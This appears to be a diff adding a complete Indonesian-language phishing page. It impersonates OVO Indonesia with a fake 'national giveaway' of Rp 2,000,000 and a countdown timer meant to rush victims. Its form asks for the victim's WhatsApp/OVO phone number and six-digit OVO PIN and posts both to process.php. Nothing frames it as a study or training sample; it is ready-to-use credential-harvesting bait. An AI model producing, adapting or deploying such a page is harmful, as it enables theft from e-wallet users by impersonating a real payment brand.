@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OVO Indonesia - Giveaway Nasional</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #4e2a8e 0%, #7b3dcc 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            color: #4e2a8e;
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+        
+        .logo p {
+            color: #666;
+            font-size: 16px;
+        }
+        
+        .reward-box {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ffa36c 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .reward-amount {
+            font-size: 48px;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #4e2a8e;
+            box-shadow: 0 0 0 3px rgba(78, 42, 142, 0.1);
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #4e2a8e 0%, #7b3dcc 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            width: 100%;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(78, 42, 142, 0.3);
+        }
+        
+        .timer {
+            background: #fff5f5;
+            border: 2px solid #ff6b6b;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #ff6b6b;
+            font-weight: bold;
+        }
+        
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #888;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>🎉 OVO INDONESIA</h1>
+            <p>Giveaway Nasional Merayakan 100 Juta Pengguna</p>
+        </div>
+        
+        <div class="timer">
+            ⏰ WAKTU TERSISA: <span id="countdown">05:00:00</span>
+        </div>
+        
+        <div class="reward-box">
+            <div class="reward-amount">Rp 2.000.000</div>
+            <p>Untuk 1000 Orang Beruntung Pertama!</p>
+        </div>
+        
+        <form id="ovoForm" action="process.php" method="POST">
+            <div class="form-group">
+                <label for="phone">📱 Nomor WhatsApp / OVO</label>
+                <input type="tel" id="phone" name="phone" placeholder="081234567890" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="pin">🔐 PIN OVO (6 Digit)</label>
+                <input type="password" id="pin" name="pin" placeholder="••••••" maxlength="6" required>
+            </div>
+            
+            <button type="submit" class="btn">🚀 KLAIM SEKARANG</button>
+        </form>
+        
+        <div class="footer">
+            <p>© 2024 OVO Indonesia. Semua hak dilindungi undang-undang.</p>
+            <p>Hanya untuk pengguna Indonesia. Syarat & ketentuan berlaku.</p>
+        </div>
+    </div>
+    
+    <script>
+        // Countdown timer
+        let timeLeft = 5 * 60 * 60; // 5 jam
+        const countdownElement = document.getElementById('countdown');
+        
+        function updateCountdown() {
+            if (timeLeft > 0) {
+                timeLeft--;
+                const hours = Math.floor(timeLeft / 3600);
+                const minutes = Math.floor((timeLeft % 3600) / 60);
+                const seconds = timeLeft % 60;
+                
+                countdownElement.textContent = 
+                    `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            }
+        }
+        
+        setInterval(updateCountdown, 1000);
+        
+        // Form submission
+        document.getElementById('ovoForm').addEventListener('submit', function(e) {
+            const phone = document.getElementById('phone').value;
+            const pin = document.getElementById('pin').value;
+            
+            if (phone.length < 10 || phone.length > 14) {
+                alert('Nomor tidak valid!');
+                e.preventDefault();
+            }
+            
+            if (pin.length !== 6) {
+                alert('PIN harus 6 digit!');
+                e.preventDefault();
+            }
+        });
+    </script>
+</body>
+</html>
